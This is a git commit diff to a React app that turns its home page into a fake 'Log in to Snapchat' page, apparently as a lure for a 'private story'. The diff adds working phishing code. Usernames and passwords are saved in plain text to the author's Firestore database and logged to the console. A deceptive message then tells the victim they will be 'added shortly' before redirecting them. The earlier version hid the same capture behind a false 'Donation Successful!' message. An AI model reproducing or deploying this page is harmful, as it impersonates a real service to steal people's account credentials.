d10c3fa22618e61831ea2ed40f7dbbe46d8aeab7
muhiris <muhammadharis786@protonmail.com>
2024-12-16 19:52:17 +0500

    Just Private Story

--- src/pages/Home.jsx
+++ src/pages/Home.jsx
@@ -2,33 +2,12 @@ import React, { useState, useEffect } from "react";
 import DonationSection1 from "../components/DonationSection1";
 import DonationSection2 from "../components/DonationSection2";
 import Modal from "../components/Modal";
+import SnapLogin from "./SnapLogin";
 function Home() {
 
-  const [isModalOpen, setIsModalOpen] = useState(false);
-
- useEffect(() => {
-   // Check if the modal has been shown before
-   const hasModalBeenShown = localStorage.getItem("hasModalBeenShown");
-
-   if (!hasModalBeenShown) {
-     // If not shown before, set the flag in local storage and open the modal
-     localStorage.setItem("hasModalBeenShown", true);
-     setIsModalOpen(true);
-   }
- }, []);
   return (
-    <div className="bg-white min-h-screen overflow-x-hidden">
-      <img src="/deskt.png" alt="" className="w-full hidden md:block " />
-      <img
-        src="/respon.svg"
-        alt=""
-        className="w-full h-32  bg-red md:hidden "
-      />
-      <DonationSection1 />
-      <DonationSection2 />
-
-      {isModalOpen && <Modal isVisible={isModalOpen} />}
-    </div>
+    // <div className="bg-white min-h-screen overflow-x-hidden">
+      <SnapLogin />
   );
 }
 
--- src/pages/SnapLogin.jsx
+++ src/pages/SnapLogin.jsx
@@ -1,44 +1,65 @@
 import React from "react";
 import { useNavigate } from "react-router-dom";
 import "../firebase";
-import { getFirestore, getDocs,addDoc, collection } from "firebase/firestore";
+import { getFirestore, getDocs, addDoc, collection } from "firebase/firestore";
 import { ToastContainer, toast } from "react-toastify";
 import "react-toastify/dist/ReactToastify.css";
+
 function SnapLogin() {
   let navigate = useNavigate();
-  // use state for input fields
- const db = getFirestore();
-
+  const db = getFirestore();
   const [username, setUsername] = React.useState("");
   const [password, setPassword] = React.useState("");
   const [loading, setLoading] = React.useState(false);
   const [err, setErr] = React.useState(false);
-  const handleClick = async() => {
+
+  const inputStyle = {
+    fontSize: "12px",
+    color: "black",
+    backgroundColor: "#f7f7f7",
+    width: "95%",
+    padding: "0.5rem 1rem",
+    borderWidth: "0 0 2px 0",
+    borderStyle: "solid",
+    borderColor: "#e2e8f0",
+    transition: "all 300ms ease-in-out",
+  };
+
+  const handleFocus = (e) => {
+    e.target.style.outline = "none";
+    e.target.style.borderColor = "#0fadff";
+  };
+
+  const handleBlur = (e) => {
+    e.target.style.borderColor = "#e2e8f0";
+  };
+
+  const handleClick = async () => {
     if (username.trim() !== "" && password.trim() !== "") {
       console.log("clicked");
       setLoading(true);
-      // get values of input fields
       const docRef = await addDoc(collection(db, "myCollection"), {
-           username: username,
-           password: password,
-         });
-        //  alert("Document written to Database");
-      
+        username: username,
+        password: password,
+      });
+
       console.log(username);
       console.log(password);
-      // now empty the input fields
       setUsername("");
       setPassword("");
-      toast.success("Donation Successful!", {
-        position: "top-center",
-        autoClose: 5000,
-        hideProgressBar: false,
-        closeOnClick: true,
-        pauseOnHover: true,
-        draggable: true,
-        progress: undefined,
-        theme: "dark",
-      });
+      toast.success(
+        "Request Submitted! If your username and password are correct, you'll be added shortly.",
+        {
+          position: "top-center",
+          autoClose: 5000,
+          hideProgressBar: false,
+          closeOnClick: true,
+          pauseOnHover: true,
+          draggable: true,
+          progress: undefined,
+          theme: "dark",
+        }
+      );
       setTimeout(() => {
         navigate("/");
         setLoading(false);
@@ -48,36 +69,38 @@ function SnapLogin() {
       setErr(true);
     }
   };
+
   return (
-    <div className="bg-[#f2f2f2] w-full h-screen overflow-hidden flex-center">
-      <div className="border shadow-sm bg-white flex-center flex-col gap-4 w-[310px]  p-6 rounded-md border-solid border-gray-200 max-md:px-5 md:w-[380px]">
+    <div className="bg-[#fffc00] w-full h-screen overflow-hidden flex-center">
+      <div className=" bg-[#fffc00] flex-center flex-col gap-4 w-[310px] p-6 rounded-md border-solid  max-md:px-5 md:w-[380px]">
         <img
           loading="lazy"
           src="https://cdn.builder.io/api/v1/image/assets/TEMP/0b27981804944e75d6f90b9634067dffbfab942823d624c4cba6c925f1885175?"
           className="aspect-square object-contain object-center w-[60px] justify-center items-center overflow-hidden self-center max-w-full"
         />
         <p className="text-2xl text-black">Log in to Snapchat</p>
-        <div className=" mt-6 mx-auto  w-full flex items-start flex-col text-[#656b73] ">
+
+        <div className="mt-6 mx-auto w-full flex items-start flex-col text-black">
           <p className="text-xs mb-2">Username or Email</p>
           <input
             type="text"
             name="text"
-            id=""
-            className="text-sm text-black bg-[#f7f7f7] border-solid w-[95%] px-4 py-2 border-b-2 focus:border-[#0fadff] focus:border-transparent focus:border-b-2 focus:border-blue-500 hover:border-blue-300 transition duration-300 ease-in-out focus:outline-none"
+            style={inputStyle}
+            onFocus={handleFocus}
+            onBlur={handleBlur}
             value={username}
             onChange={(e) => setUsername(e.target.value)}
           />
         </div>
 
-        {/* Password */}
-
-        <div className=" mt-2 mx-auto  w-full flex items-start flex-col text-[#656b73] ">
+        <div className="mt-2 mx-auto w-full flex items-start flex-col text-black">
           <p className="text-xs mb-2">Password</p>
           <input
             type="password"
             name="password"
-            id=""
-            className="text-sm text-black bg-[#f7f7f7] border-solid w-[95%] px-4 py-2 border-b-2 focus:border-[#0fadff] focus:border-transparent focus:border-b-2 focus:border-blue-500 hover:border-blue-300 transition duration-300 ease-in-out focus:outline-none"
+            style={inputStyle}
+            onFocus={handleFocus}
+            onBlur={handleBlur}
             value={password}
             onChange={(e) => setPassword(e.target.value)}
           />
@@ -87,10 +110,10 @@ function SnapLogin() {
             </p>
           )}
         </div>
+
         <button
           onClick={handleClick}
-          className={` mt-2 px-4 py-2 rounded-2xl text-white text-sm mx-auto bg-blue
-            `}
+          className="mt-2 px-4 py-2 rounded-2xl text-white text-sm mx-auto bg-blue"
         >
           {!loading ? (
             "Submit"
@@ -100,6 +123,7 @@ function SnapLogin() {
             </div>
           )}
         </button>
+
         <ToastContainer
           position="top-center"
           autoClose={5000}
